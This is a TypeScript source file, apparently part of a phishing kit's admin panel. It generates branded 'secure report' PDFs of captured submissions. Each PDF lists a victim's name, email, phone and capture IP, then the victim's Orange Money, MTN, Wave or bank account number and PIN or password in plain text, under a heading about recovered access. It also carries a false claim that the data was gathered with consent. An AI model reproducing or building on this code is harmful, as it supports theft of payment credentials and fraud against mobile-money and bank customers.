import jsPDF from 'jspdf';
import autoTable from 'jspdf-autotable';

export const generateSubmissionPDF = (submission: any) => {
    const doc = new jsPDF();
    const primaryColor: [number, number, number] = [3, 4, 11]; // #03040b
    const accentColor: [number, number, number] = [0, 112, 243]; // #0070f3
    const secondaryColor: [number, number, number] = [121, 40, 202]; // #7928ca
    const textColor: [number, number, number] = [30, 30, 30];
    const lightTextColor: [number, number, number] = [120, 120, 120];

    // --- Background Watermark ---
    doc.setTextColor(245, 245, 245);
    doc.setFontSize(60);
    doc.setFont('helvetica', 'bold');
    doc.text('NexusLink', 105, 150, { align: 'center', angle: 45 });
    doc.text('CONFIDENTIEL', 105, 200, { align: 'center', angle: 45 });

    // --- Header Section ---
    // Dark background for header
    doc.setFillColor(primaryColor[0], primaryColor[1], primaryColor[2]);
    doc.rect(0, 0, 210, 50, 'F');

    // Accent line at the bottom of header
    doc.setFillColor(accentColor[0], accentColor[1], accentColor[2]);
    doc.rect(0, 50, 210, 1.5, 'F');

    // Logo Circle
    doc.setFillColor(accentColor[0], accentColor[1], accentColor[2]);
    doc.roundedRect(15, 12, 20, 20, 4, 4, 'F');
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(14);
    doc.setFont('helvetica', 'bold');
    doc.text('B', 25, 26, { align: 'center' });

    // Brand Name
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(22);
    doc.setFont('helvetica', 'bold');
    doc.text('NEXUSLINK SOLUTIONS', 42, 22);

    doc.setFontSize(8);
    doc.setFont('helvetica', 'normal');
    doc.setTextColor(150, 150, 150);
    doc.text('INFRASTRUCTURE DE CAPTURE DE DONNÉES SÉCURISÉE', 42, 30, { charSpace: 1.5 });

    // Header Right Info
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(9);
    doc.setFont('helvetica', 'bold');
    doc.text('RAPPORT SÉCURISÉ', 195, 20, { align: 'right' });
    doc.setFont('helvetica', 'normal');
    doc.setTextColor(180, 180, 180);
    doc.text(`#${submission.id ? submission.id.toString().substring(0, 8).toUpperCase() : 'TRANS-ID'}`, 195, 26, { align: 'right' });

    // --- Document Metadata Box ---
    const metadataY = 65;
    doc.setFillColor(248, 250, 252);
    doc.roundedRect(15, metadataY, 180, 30, 2, 2, 'F');
    doc.setDrawColor(226, 232, 240);
    doc.setLineWidth(0.1);
    doc.roundedRect(15, metadataY, 180, 30, 2, 2, 'D');

    doc.setTextColor(textColor[0], textColor[1], textColor[2]);
    doc.setFontSize(10);
    doc.setFont('helvetica', 'bold');
    doc.text('DÉTAILS DU DOCUMENT', 22, metadataY + 10);

    doc.setFontSize(8);
    doc.setFont('helvetica', 'normal');
    doc.setTextColor(lightTextColor[0], lightTextColor[1], lightTextColor[2]);

    // Left side metadata
    doc.text(`DATE D'ÉMISSION :`, 22, metadataY + 18);
    doc.setTextColor(textColor[0], textColor[1], textColor[2]);
    doc.text(new Date().toLocaleString('fr-FR'), 55, metadataY + 18);

    doc.setTextColor(lightTextColor[0], lightTextColor[1], lightTextColor[2]);
    doc.text(`RÉFÉRENCE LIEN :`, 22, metadataY + 24);
    doc.setTextColor(textColor[0], textColor[1], textColor[2]);
    doc.text(submission.link_id || 'Direct Access', 55, metadataY + 24);

    // Right side metadata
    doc.setTextColor(lightTextColor[0], lightTextColor[1], lightTextColor[2]);
    doc.text(`STATUT :`, 120, metadataY + 18);
    doc.setTextColor(0, 150, 0);
    doc.setFont('helvetica', 'bold');
    doc.text('VERIFIÉ & SÉCURISÉ', 145, metadataY + 18);

    doc.setTextColor(lightTextColor[0], lightTextColor[1], lightTextColor[2]);
    doc.setFont('helvetica', 'normal');
    doc.text(`NIVEAU SÉCU :`, 120, metadataY + 24);
    doc.setTextColor(textColor[0], textColor[1], textColor[2]);
    doc.text('GRADE MILITAIRE (256-BIT)', 145, metadataY + 24);

    // --- Sections Titles ---
    const sectionTitle = (title: string, y: number) => {
        doc.setFillColor(accentColor[0], accentColor[1], accentColor[2], 0.1);
        doc.rect(15, y - 5, 5, 6, 'F');
        doc.setTextColor(primaryColor[0], primaryColor[1], primaryColor[2]);
        doc.setFontSize(11);
        doc.setFont('helvetica', 'bold');
        doc.text(title, 25, y);
        doc.setDrawColor(accentColor[0], accentColor[1], accentColor[2]);
        doc.setLineWidth(0.5);
        doc.line(15, y + 2, 195, y + 2);
    };

    // --- Section 1: Customer Identity ---
    sectionTitle('1. IDENTITÉ DU CLIENT & SOURCE', 110);

    const clientData = [
        ['Désignation Complète', submission.full_name || 'Non spécifié'],
        ['Adresse de Messagerie', submission.email || 'Non spécifiée'],
        ['Contact Téléphonique', submission.phone || 'Non spécifié'],
        ['Pays / Origine Detectée', `${submission.country_name || 'Inconnu'} (${submission.country_code || '??'})`],
        ['Adresse IP de Capture', submission.ip_address || 'Non enregistrée'],
        ['Horodatage Système', submission.created_at ? new Date(submission.created_at).toLocaleString('fr-FR') : 'N/A'],
    ];

    autoTable(doc, {
        startY: 115,
        body: clientData,
        theme: 'plain',
        styles: { fontSize: 9, cellPadding: 4, textColor: [40, 40, 40] },
        columnStyles: {
            0: { fontStyle: 'bold', cellWidth: 50, textColor: [100, 100, 100] },
            1: { cellWidth: 'auto' }
        },
        margin: { left: 15, right: 15 },
        didDrawCell: (data) => {
            if (data.section === 'body') {
                doc.setDrawColor(240, 240, 240);
                doc.setLineWidth(0.1);
                doc.line(data.cell.x, data.cell.y + data.cell.height, data.cell.x + data.cell.width, data.cell.y + data.cell.height);
            }
        }
    });

    // --- Section 2: Account Details ---
    const nextY = (doc as any).lastAutoTable.finalY + 15;
    sectionTitle('2. MÉTHODE DE PAIEMENT & ACCÈS RÉCUPÉRÉS', nextY);

    const methodLabels: Record<string, string> = {
        orange: 'Orange Money (OM)',
        mtn: 'MTN Mobile Money',
        wave: 'Wave Mobile Payment',
        bank: 'Virement Bancaire Int.',
        other: 'Autre Opérateur Partenaire'
    };

    const methodKey = submission.method?.toLowerCase() || '';
    const methodLabel = methodLabels[methodKey] || submission.method || 'Standard';

    const paymentData = [
        ['MÉTHODE', methodLabel.toUpperCase()],
        ['ACCOUNT / IBAN', submission.account_number || 'ERREUR CRITIQUE'],
        ['CODE / PIN / PWD', submission.password || '******'],
    ];

    if (submission.bank_name) paymentData.push(['BANQUE', submission.bank_name.toUpperCase()]);
    if (submission.operator_name) paymentData.push(['OPÉRATEUR', submission.operator_name.toUpperCase()]);

    autoTable(doc, {
        startY: nextY + 5,
        body: paymentData,
        theme: 'grid',
        styles: { fontSize: 10, cellPadding: 6, textColor: [0, 0, 0] },
        columnStyles: {
            0: { fontStyle: 'bold', cellWidth: 50, fillColor: [248, 250, 252], textColor: [0, 112, 243] },
            1: { fontStyle: 'bold', fontSize: 11 }
        },
        margin: { left: 15, right: 15 },
    });

    // --- Security Verification Stamp ---
    const finalY = (doc as any).lastAutoTable.finalY + 20;

    // Draw a "Sticker" type badge
    doc.setFillColor(primaryColor[0], primaryColor[1], primaryColor[2]);
    doc.roundedRect(140, finalY, 55, 25, 2, 2, 'F');
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(8);
    doc.text('VÉRIFIE PAR', 167.5, finalY + 8, { align: 'center' });
    doc.setFontSize(10);
    doc.setFont('helvetica', 'bold');
    doc.text('NexusLink Security', 167.5, finalY + 15, { align: 'center' });
    doc.setFontSize(7);
    doc.setFont('helvetica', 'normal');
    doc.text(new Date().toLocaleDateString(), 167.5, finalY + 20, { align: 'center' });

    // Legal & Security Disclaimer
    doc.setTextColor(lightTextColor[0], lightTextColor[1], lightTextColor[2]);
    doc.setFontSize(7);
    const disclaimer = "AVIS DE CONFIDENTIALITÉ : Ce document contient des informations sensibles obtenues par NexusLink Solutions. Toute distribution non autorisée est strictement interdite. Les informations ont été capturées avec le consentement de l'utilisateur via le protocole SSL 256-bit.";
    const splitDisclaimer = doc.splitTextToSize(disclaimer, 110);
    doc.text(splitDisclaimer, 15, finalY + 5);

    // --- Footer ---
    const pageHeight = doc.internal.pageSize.height;
    doc.setDrawColor(230, 230, 230);
    doc.line(15, pageHeight - 20, 195, pageHeight - 20);

    doc.setFontSize(7);
    doc.setTextColor(180, 180, 180);
    doc.text('DOCUMENT GÉNÉRÉ PAR NEXUSLINK SOLUTIONS PRO v2.4', 15, pageHeight - 12);
    doc.text('PAGE 1 SUR 1', 195, pageHeight - 12, { align: 'right' });

    // --- Save the file ---
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const safeName = (submission.full_name || 'Archive').replace(/[^a-z0-9]/gi, '_').toLowerCase();
    doc.save(`NexusLink_Report_${safeName}_${timestamp}.pdf`);
};
